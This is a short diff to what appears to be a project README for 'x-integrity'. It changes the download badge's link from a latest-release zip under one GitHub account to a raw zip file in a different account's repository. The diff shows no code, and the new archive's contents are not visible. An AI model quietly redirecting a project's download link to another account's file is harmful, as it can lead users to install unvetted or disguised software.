@@ -13,7 +13,7 @@
 
 <p align="center">
   <br>
-  <a href="https://github.com/boba/x-integrity/releases/latest/download/x-integrity-v1.0.0.zip">
+  <a href="https://github.com/bondanbanuaji/x-integrity/raw/main/x-integrity-v1.0.0.zip">
     <img src="https://img.shields.io/badge/⬇_DOWNLOAD_HERE-x--integrity--v1.0.0.zip-0078D4?style=for-the-badge&logo=android&logoColor=white" alt="Download">
   </a>
   <br><br>
